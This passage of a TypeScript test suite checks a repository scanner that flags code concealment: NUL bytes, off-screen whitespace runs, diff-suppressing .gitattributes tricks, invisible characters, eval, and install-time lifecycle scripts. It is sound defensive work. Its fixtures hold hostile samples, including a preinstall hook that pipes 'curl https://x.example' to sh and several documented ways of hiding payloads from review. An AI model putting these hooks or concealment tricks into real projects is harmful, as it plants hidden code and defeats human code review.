    // nothing at all — strictly better concealment than the off-screen trick.
    const withNul = `export const V = '1.0.0';${NUL} export function init() {}\n`;
    await withTree({ 'src/mod.ts': withNul }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('NUL byte');
    });
  });

  test('a NUL in a real binary is still skipped quietly', async () => {
    await withTree({ 'docs/logo.png': `PK${NUL}${NUL}payload` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test('an extensionless file with a NUL is reported', async () => {
    // No extension means no binary claim, so it must not get the free pass.
    await withTree({ 'scripts/hook': `#!/bin/sh${NUL}\n` }, ({ code }) => expect(code).toBe(1));
  });
});

describe('unicode spaces cannot hide the gap (Fable review)', () => {
  const NBSP = String.fromCharCode(0x00a0);
  const NARROW_NBSP = String.fromCharCode(0x202f);
  const IDEOGRAPHIC = String.fromCharCode(0x3000);

  test.each([
    ['NBSP', NBSP],
    ['narrow NBSP', NARROW_NBSP],
    ['ideographic space', IDEOGRAPHIC],
  ])('a %s run pushes a payload off-screen and is caught', async (_label, gap) => {
    // All are valid ECMAScript whitespace and render as blank horizontal
    // space, so they push a payload off the right edge exactly like spaces —
    // but the old `[ \t]`-only rule never matched them.
    const line = `const a = 1;${gap.repeat(45)}require('child_process').execSync('x');${'y'.repeat(60)}\n`;
    await withTree({ 'src/a.ts': line }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('whitespace run');
    });
  });
});

describe('nested manifests and .mdx (Fable review)', () => {
  test('a lifecycle script in a workspace package.json is caught', async () => {
    // Workspace installs run sub-package lifecycle scripts; only the root
    // manifest was being checked.
    const pkg = JSON.stringify({ scripts: { postinstall: 'node evil.js' } });
    await withTree({ 'packages/sub/package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('postinstall');
    });
  });

  test('.mdx keeps the code rules — it compiles to JS', async () => {
    await withTree(
      { 'docs/page.mdx': `export const x = 1;${' '.repeat(60)}eval(y);${'z'.repeat(80)}\n` },
      ({ code }) => expect(code).toBe(1)
    );
  });
});

describe('diff-suppressing gitattributes (Fable review, item 1)', () => {
  test.each([
    ['binary', 'src/payload.ts binary'],
    ['-diff', 'src/payload.ts -diff'],
    ['linguist-generated', 'src/payload.ts linguist-generated=true'],
    // A glob, since the binary allowance operates on globs — this is the shape
    // the rule actually has to keep rejecting.
    ['a glob pattern', '*.ts binary'],
  ])('flags %s', async (_label, line) => {
    // The same class as the NUL bypass reached without a NUL: one tracked
    // .gitattributes line makes git and GitHub print "Binary files differ" (or
    // fold the diff), so the payload file itself can be plain, valid,
    // NUL-free TypeScript and every other rule in this gate passes.
    await withTree(
      { '.gitattributes': `${line}\n`, 'src/payload.ts': 'const a = 1;\n' },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('gitattribute');
      }
    );
  });

  test.each([
    ['a bare linguist-generated, which git reads as set', 'src/payload.ts linguist-generated'],
    ['linguist-generated=true', 'src/payload.ts linguist-generated=true'],
    // Linguist's own boolean_attribute is `attribute != "false"`, so every
    // value other than that literal collapses the diff. Anchoring on `=true`
    // alone would have waved this through.
    ['a non-true value linguist still treats as set', 'src/payload.ts linguist-generated=1'],
  ])('flags %s', async (_label, line) => {
    await withTree({ '.gitattributes': `${line}\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('gitattribute');
    });
  });

  test.each([
    ['linguist-generated=false', 'src/payload.ts linguist-generated=false'],
    ['-linguist-generated, the unset form', 'src/payload.ts -linguist-generated'],
  ])('does not flag %s, which UN-collapses the diff', async (_label, line) => {
    // The unanchored /linguist-generated/ matched these too, and they are the
    // opposite of concealment: they take a file OUT of the "Load diff" fold.
    // Reporting them told an author to remove the thing making their file
    // reviewable.
    await withTree({ '.gitattributes': `${line}\n` }, ({ code }) => expect(code).toBe(0));
  });

  test('leaves the legitimate attributes alone', async () => {
    // text=auto / eol=lf / linguist-language do not hide content, which is why
    // the rule refuses the suppressing attributes rather than allow-listing
    // the safe ones.
    const attrs = '* text=auto eol=lf\n*.ts linguist-language=TypeScript\n# a comment\n';
    await withTree({ '.gitattributes': attrs }, ({ code }) => expect(code).toBe(0));
  });

  test('the finding names the remedy, so it is actionable without reading the gate', async () => {
    // The allowance's own comment says an author who genuinely needs diff
    // suppression "writes the exemption, which is what this gate's failure
    // message asks for" — and the message did not mention an exemption at all.
    // A reviewer hitting this had to go read scripts/check-concealment.ts to
    // find out what to do about it.
    await withTree({ '.gitattributes': '*.wasm binary\n' }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('INERT_BINARY_EXTENSIONS');
    });
  });

  test('checks a nested .gitattributes too', async () => {
    await withTree({ 'src/.gitattributes': 'payload.ts binary\n' }, ({ code }) =>
      expect(code).toBe(1)
    );
  });
});

describe('scoping follow-ups (review of #679)', () => {
  test('a tracked file under a SKIP_DIRS name is still scanned', async () => {
    // SKIP_DIRS is for UNREVIEWED LOCAL ARTIFACTS. A tracked file is in a diff
    // by definition — excluding build/loader.ts by directory name would turn a
    // list of vendored-output names into a list of places a payload can sit
    // unwatched, which is the shape this gate argues against.
    await withGitTree({ 'build/loader.ts': concealed }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('build/loader.ts');
    });
  });

  test('an untracked file under a SKIP_DIRS name is skipped', async () => {
    // The other half: local build output must not produce findings nobody can fix.
    await withGitTree({ 'src/a.ts': 'const a = 1;\n' }, ({ code }) => expect(code).toBe(0), {
      'build/generated.ts': concealed,
    });
  });

  test('a FILE named like a skipped directory is scanned', async () => {
    // An extensionless `scripts/build` is a shell script — the same shape as
    // .husky/pre-push. Matching SKIP_DIRS against the basename dropped it.
    await withTree({ 'scripts/build': concealed }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('scripts/build');
    });
  });

  test('an untracked FILE named like a skipped directory is scanned (git path)', async () => {
    // The sibling test above covers the walk. This covers the git path's own
    // segment test, which must also mean "directory segment" — `scripts/build`
    // is a shell script, not a build directory.
    await withGitTree(
      { 'src/a.ts': 'const a = 1;\n' },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('scripts/build');
      },
      { 'scripts/build': concealed }
    );
  });

  test('a mid-line # in a gitattributes path is not a comment', async () => {
    // gitattributes(5): only lines BEGINNING with # are ignored. Stripping
    // from any # parsed `src/pay#load.ts binary` down to `src/pay`, matched
    // nothing, and left the real file diff-suppressed.
    await withTree({ '.gitattributes': 'src/pay#load.ts binary\n' }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('gitattribute');
    });
  });

  test.each([
    ['NBSP', String.fromCharCode(0x00a0)],
    ['form feed', '\f'],
    ['vertical tab', '\v'],
  ])('a line starting with %s then # is NOT a comment to git', async (_label, lead) => {
    // git's blank set is space, tab and CR — probed one character at a time on
    // 2.50.1 — so none of these is skipped before the `#` test and each line is
    // a real pattern to git. JS .trim() stripped them and read the line as a
    // comment, the mirror image of the mid-line-# bug fixed alongside it.
    await withTree({ '.gitattributes': `${lead}# payload.ts binary\n` }, ({ code }) =>
      expect(code).toBe(1)
    );
  });

  test('a CR separates the pattern from its attributes, as it does for git', async () => {
    // Variation seven of the blank-set mismatch, and the first that came from
    // this file asserting the WRONG SET rather than using JS's. Probed on git
    // 2.50.1, one character at a time: space, tab and CR are blanks to git;
    // form feed, vertical tab and NBSP are not.
    //
    // So `src/payload.ts<CR>cover.png -diff` is `src/payload.ts` + the
    // attributes `cover.png` and `-diff` to git, which unsets diff on a .ts
    // file — confirmed with `git check-attr diff src/payload.ts`. Splitting on
    // `[ \t]+` alone swallowed the CR and read the first token as
    // `src/payload.ts<CR>cover.png`, whose extension is `.png`, so the inert
    // allowance returned before the attribute loop ever ran. A CR is invisible
    // in a GitHub diff and INVISIBLE has no C0 controls, so nothing else
    // caught it.
    await withTree(
      { '.gitattributes': 'src/payload.ts\rcover.png -diff\n' },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('gitattribute');
      }
    );
  });

  test('a CR before a # IS a comment to git, so it is one here', async () => {
    // The other side of the same set: git's leading-blank skip takes CR too, so
    // this line is a comment and reporting it would be a false positive. The
    // gate used to report it. Kept next to the NBSP/form-feed/vertical-tab
    // cases below, which are NOT blanks and so must still be reported — the
    // pair is what pins the set to exactly what git uses.
    await withTree({ '.gitattributes': '\r# payload.ts binary\n' }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test.each([
    ['.GITATTRIBUTES', '.GITATTRIBUTES', 'src/payload.ts binary\n'],
    ['PACKAGE.JSON', 'PACKAGE.JSON', '{"scripts":{"postinstall":"echo pwned"}}\n'],
  ])('a case-variant %s is still routed to its checker', async (_l, name, contents) => {
    // Variation eight. The routing matched the filename exact-case, but this
    // repo is developed on macOS and consumers run Windows — both
    // case-insensitive — where the lookup resolves regardless of case. Probed
    // on this filesystem: `git check-attr diff src/payload.ts` reports
    // `diff: unset` from a file named `.GITATTRIBUTES`, and `npm pkg get
    // scripts` returns the postinstall from a file named `PACKAGE.JSON`. The
    // gate exited 0 on both.
    await withTree({ [name]: contents, 'src/payload.ts': 'const a = 1;\n' }, ({ code }) =>
      expect(code).toBe(1)
    );
  });

  describe.skipIf(!FS_FOLDS_LONG_S)(
    'unicode-folded filenames (case-insensitive filesystems)',
    () => {
      test.each([
        ['.gitattributes', `.gitattribute${LONG_S}`, 'src/payload.ts binary\n'],
        ['package.json', `package.j${LONG_S}on`, '{"scripts":{"postinstall":"echo pwned"}}\n'],
      ])('a U+017F fold of %s is still routed to its checker', async (_l, name, contents) => {
        // Variation ten, and it was introduced by the fix for eight and nine.
        // Lowercasing the basename is a fold function written in JS standing in
        // for the filesystem's, and they disagree: APFS folds U+017F to `s`,
        // String.prototype.toLowerCase does not. Verified end-to-end on this
        // filesystem — `git check-attr` reports `binary: set` from a file named
        // `.gitattribute<U+017F>`, and `npm pkg get scripts` returns the
        // postinstall from `package.j<U+017F>on`, while the gate exited 0.
        //
        // The gate no longer holds an opinion about folding: it asks the OS which
        // file the name `.gitattributes` opens to in that directory.
        await withTree({ [name]: contents, 'src/payload.ts': 'const a = 1;\n' }, ({ code }) =>
          expect(code).toBe(1)
        );
      });
    }
  );

  test('routing follows what the name RESOLVES to, not what the name folds to', async () => {
    // The U+017F cases above are skipped wherever the filesystem does not fold,
    // and CI is ubuntu/ext4 — so the detector for the headline fix runs only on
    // a contributor's Mac. This pins the same property on any filesystem.
    //
    // A symlink asks the same question a case-fold asks: `manifest.json` is a
    // real file whose own name no fold function turns into `package.json`, and
    // `package.json` in that directory opens it. npm agrees — `npm pkg get
    // scripts` in exactly this tree returns `{"postinstall": "echo pwned"}`,
    // run against real npm rather than assumed.
    //
    // The assertion is on `manifest.json` and NOT on the exit code, and that
    // distinction is the whole test. The symlink is itself listed by the walk,
    // and its own basename routes it, so the gate exits 1 either way:
    // `expect(code).toBe(1)` alone passes against the pre-fix basename fold —
    // measured by running scripts/check-concealment.ts from commit 28cd61ad
    // over this tree, which reported one finding, at package.json. Only the
    // realpath oracle reports the TARGET's path, so only that assertion goes
    // red if routing reverts to folding a basename.
    //
    // It does not pin `realpathSync.native` over plain `realpathSync`: both
    // resolve a symlink, and the case-fold divergence between them cannot be
    // reproduced on a case-sensitive filesystem. Checked, not assumed — the
    // gate with `.native` sed'd out still reports manifest.json here. That
    // choice rests on the runtime table in answersToName's docstring.
    await withTree(
      {
        'manifest.json': '{"scripts":{"postinstall":"echo pwned"}}\n',
        'src/a.ts': 'const a = 1;\n',
      },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('manifest.json');
        expect(stderr).toContain('postinstall');
      },
      { 'package.json': 'manifest.json' }
    );
  });

  test('an unterminated quote does not reach the inert allowance', async () => {
    // git's parse_attr_line falls to its else-branch when unquote_c_style
    // fails, and reads the raw token — quote mark included — as a literal path.
    // Probed on git 2.50.1 with `"cover.png binary`: `git check-attr binary --
    // 'cover.png' '"cover.png'` answers `unspecified` for the first and `set`
    // for the second, so nothing that executes is concealed and the gate and
    // git agree on the outcome.
    //
    // They agreed for unrelated reasons, though: git because the unquote
    // failed, the gate because the token it fell back to happens to end in an
    // inert extension. That is the coincidence every earlier variation in this
    // function was built on, so the allowance no longer answers for a pattern
    // the parser refused to parse.
    await withTree({ '.gitattributes': '"cover.png binary\n' }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('diff-suppressing gitattribute');
    });
  });

  test('an NBSP in the pattern does not tokenize it into the allowance', async () => {
    // git splits pattern from attributes on spaces and tabs ONLY, so the real
    // pattern here is `evil.png<NBSP>run.ts` — a .ts file, not inert, and its
    // diff must not be suppressed. Splitting on JS \s truncated it to
    // `evil.png`, which IS inert, and the allowance let it through. Fails
    // open, which is why it is pinned.
    const nbsp = String.fromCharCode(0x00a0);
    await withTree({ '.gitattributes': `evil.png${nbsp}run.ts binary\n` }, ({ code }) =>
      expect(code).toBe(1)
    );
  });

  test('a quoted pattern does not tokenize into the allowance', async () => {
    // Verified against real git: `"evil run.ts" binary` sets binary on
    // `evil run.ts`. Naive tokenizing yields `"cover.png`, whose extension
    // reads as inert, so the allowance would wave through a .ts file.
    await withTree({ '.gitattributes': '"cover.png run.ts" binary\n' }, ({ code }) =>
      expect(code).toBe(1)
    );
  });

  test('a legitimately quoted binary path is still allowed', async () => {
    // The quoted form is parsed, not refused: `"my docs/logo.png" binary` is
    // legitimate, and refusing every quoted pattern would fail the gate on it.
    await withTree({ '.gitattributes': '"my docs/logo.png" binary\n' }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test('a quoted gitattributes pattern with a backslash does not reach the inert allowance', async () => {
    // Stripping backslashes can only SHORTEN the string, so an escape after the
    // last dot manufactures an inert-looking extension git never resolves to:
    // `"evil.p\ng"` reads as `.png` to a naive strip and as a literal newline to
    // git's unquote_c_style. The strip was an approximation of that function and
    // it failed OPEN, so the escape form now misses the allowance entirely.
    await withTree({ '.gitattributes': '"evil.p\\ng" binary\n' }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('diff-suppressing gitattribute');
    });
  });

  test.each([
    ['binary', '[attr]a.png binary', 'src/payload.ts a.png'],
    ['-diff', '[attr]b.pdf -diff', 'src/payload.ts b.pdf'],
    ['linguist-generated', '[attr]c.zip linguist-generated', 'src/payload.ts c.zip'],
  ])('a macro definition carrying %s is not waved through by its name', async (_l, def, use) => {
    // gitattributes has a SECOND line form the parser had no concept of:
    // `[attr]<name> <attrs...>` defines a macro, and attr_name_valid permits
    // dots in the name. So `[attr]a.png` puts `.png` in front of an extension
    // check that is only meaningful for paths, and the macro then sets `binary`
    // on whatever claims it. Verified against real git: payload.ts renders as
    // `Binary files ... differ` while the gate exited 0.
    await withTree(
      { '.gitattributes': `${def}\n${use}\n`, 'src/payload.ts': 'const a = 1;\n' },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('gitattribute');
      }
    );
  });

  test.each([
    ['binary', '"[attr]a.png" binary', 'src/payload.ts a.png'],
    ['-diff', '"[attr]b.pdf" -diff', 'src/payload.ts b.pdf'],
    ['linguist-generated', '"[attr]c.zip" linguist-generated', 'src/payload.ts c.zip'],
  ])('a QUOTED macro definition carrying %s is caught too', async (_l, def, use) => {
    // The same hole one quote-mark to the left. git unquotes BEFORE testing for
    // the macro prefix, so a quoted `[attr]` really does define a macro —
    // verified on git 2.50.1: `"[attr]a.png" -diff` + `src/payload.ts a.png`
    // gives `src/payload.ts: diff: unset`, and git diff prints
    // `Binary files a/src/payload.ts and b/src/payload.ts differ`.
    //
    // So the macro test cannot read the raw line; it has to read the same
    // unquoted token the extension check reads, which is the only arrangement
    // where one form cannot be handled and the other missed.
    await withTree(
      { '.gitattributes': `${def}\n${use}\n`, 'src/payload.ts': 'const a = 1;\n' },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('gitattribute');
      }
    );
  });

  test('a quoted macro whose name is not extension-shaped was always reported', async () => {
    // The control for the quoted form, and the same tell as its unquoted twin:
    // the escape depended entirely on the name ending in an inert extension.
    await withTree({ '.gitattributes': '"[attr]zz" binary\n' }, ({ code }) => expect(code).toBe(1));
  });

  test('a macro whose name is not extension-shaped was always reported', async () => {
    // The control that shows the hole above was accidental rather than
    // designed: the identical macro escapes only when its name happens to end
    // in an inert extension.
    await withTree({ '.gitattributes': '[attr]zz binary\n' }, ({ code }) => expect(code).toBe(1));
  });

  test('an executable binary format is NOT auto-approved', async () => {
    // BINARY_EXTENSIONS answers "where is a NUL expected"; it includes .wasm,
    // .node, .so, .exe. Reusing it here would bless diff suppression on the
    // formats whose whole point is that they execute.
    await withTree({ '.gitattributes': '*.wasm binary\n' }, ({ code }) => expect(code).toBe(1));
  });

  test('a leading # in gitattributes is still a comment', async () => {
    await withTree({ '.gitattributes': '# src/payload.ts binary\n' }, ({ code }) =>
      expect(code).toBe(0)
    );
  });

  test('marking a genuinely binary type is allowed', async () => {
    // *.png binary is standard boilerplate and suppresses a diff nobody could
    // read anyway. Refusing it would fail the gate with advice the author
    // cannot act on.
    await withTree({ '.gitattributes': '*.png binary\n*.pdf binary\n' }, ({ code }) =>
      expect(code).toBe(0)
    );
  });
});

describe('invisible characters', () => {
  test('flags a zero-width space', async () => {
    await withTree({ 'src/a.ts': `const a${ZWSP} = 1;\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('U+200B');
    });
  });

  test('flags a right-to-left override', async () => {
    await withTree({ 'src/a.ts': `const s = 'x${RLO}';\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('U+202E');
    });
  });

  test('allows a zero-width joiner inside an emoji sequence', async () => {
    // Captured GraphQL fixtures carry real emoji; flagging these would make the
    // gate noisy enough to be switched off.
    const emoji = `${SHRUG}${ZWJ}${MALE_SIGN}${VS16}`;
    await withTree({ 'src/a.ts': `const e = '${emoji}';\n` }, ({ code }) => expect(code).toBe(0));
  });

  test('flags a zero-width joiner between ASCII, which is not an emoji sequence', async () => {
    await withTree({ 'src/a.ts': `const ab${ZWJ}cd = 1;\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('U+200D');
    });
  });
});

describe('dynamic code execution', () => {
  const cases: Array<[string, string]> = [
    ['eval', 'eval(userInput);\n'],
    ['new Function', "const f = new Function('return 1');\n"],
    ['constructor indirection', "const F = ({})['constructor'];\n"],
    ['hex-escape run', "const s = '\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x74\\x68\\x69\\x73';\n"],
  ];

  for (const [name, body] of cases) {
    test(`flags ${name}`, async () => {
      await withTree({ 'src/a.ts': body }, ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('src/a.ts');
      });
    });
  }

  test('does not flag the substring eval inside an identifier', async () => {
    await withTree(
      { 'src/a.ts': 'const retrieval = compute();\nthis.evaluate(x);\n' },
      ({ code }) => expect(code).toBe(0)
    );
  });
});

describe('install-time lifecycle scripts', () => {
  test('flags postinstall', async () => {
    const pkg = JSON.stringify({ scripts: { postinstall: 'node evil.js' } });
    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('postinstall');
    });
  });

  test('flags preinstall', async () => {
    const pkg = JSON.stringify({ scripts: { preinstall: 'curl https://x.example | sh' } });
    await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(1));
  });

  test('flags prepublish, the deprecated hook that also ran on install', async () => {
    const pkg = JSON.stringify({ scripts: { prepublish: 'node build.js' } });
    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('prepublish');
    });
  });

  test('allows the husky prepare hook this repo actually uses', async () => {
    const pkg = JSON.stringify({ scripts: { prepare: 'husky' } });
    await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(0));
  });

  test('flags a prepare hook that is not husky', async () => {
    const pkg = JSON.stringify({ scripts: { prepare: 'node fetch-payload.js' } });
    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('prepare');
    });
  });
});

describe('reporting', () => {
  test('reports every distinct finding rather than stopping at the first', async () => {
    await withTree(
      {
        'src/a.ts': `const a${ZWSP} = 1;\n`,
        'src/b.ts': 'eval(x);\n',
        'scripts/c.ts': `};${' '.repeat(200)}payload();\n`,
      },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('src/a.ts');
        expect(stderr).toContain('src/b.ts');
        expect(stderr).toContain('scripts/c.ts');
      }
    );
  });

  test('names the line number so a finding can be opened directly', async () => {
    await withTree({ 'src/a.ts': `const ok = 1;\nconst bad${ZWSP} = 2;\n` }, ({ stderr }) => {
      expect(stderr).toContain('src/a.ts:2');
    });
  });
});
